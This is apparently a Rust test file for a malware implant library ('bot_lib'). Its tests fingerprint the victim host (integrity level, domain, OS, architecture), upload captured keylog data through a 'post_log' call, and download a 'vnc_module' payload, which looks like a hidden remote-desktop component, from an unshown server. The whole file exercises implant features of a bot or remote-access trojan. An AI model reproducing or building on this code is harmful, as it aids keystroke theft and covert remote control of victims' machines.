mod utility_verify {
    use bot_lib::{http::{download_rsrc, post_log, return_values, text_encoding}, *};


    #[test]
    fn agent_metadata() {
        println!("{:#?}",get_integrity_level());
        println!("{:#?}",get_user_domain().unwrap());
        println!("{:#?}",os_release());
        println!("{:#?}",get_this_module_path());
        println!("{:#?}",get_arch());
        println!("{:#?}",get_platform());
    }

    #[test]
    fn test_post_keylog() {
        let dummy_data:Vec<u8> = Vec::from("asdfasdfasdfasdf");

        unsafe {
            match post_log(dummy_data.as_ptr(),dummy_data.len(),501,text_encoding::utf8) {
                result => {
                    println!("{:?}",result);
                }
            };
        } 
    }


        #[test]
    fn test_download_resource() {
        unsafe {
            let module = "vnc_module\0";
            let module: Vec<u16> = module.encode_utf16().collect();

            let mut required_size: usize = 0;
            match download_rsrc(
                module.as_ptr(),
                std::ptr::null_mut(),
                0,
                &mut required_size,
            ) {
                return_values::buffer_too_small => {
                println!("Content-Length detected: {} bytes", required_size);
                
                let mut buffer: Vec<u8> = vec![0; required_size];
                let mut bytes_written: usize = 0;
                
                let result = download_rsrc(
                    module.as_ptr(),
                    buffer.as_mut_ptr(),
                    buffer.len(),
                    &mut bytes_written,
                );
                
                println!("Second call result: {:?}, bytes_written: {}", result, bytes_written);
                assert!(bytes_written > 0, "Should have downloaded some data");
                println!("Successfully downloaded {} bytes", bytes_written);
                },

                result => {
                    println!("{:?}",result);
                },
            }
        }
    }
}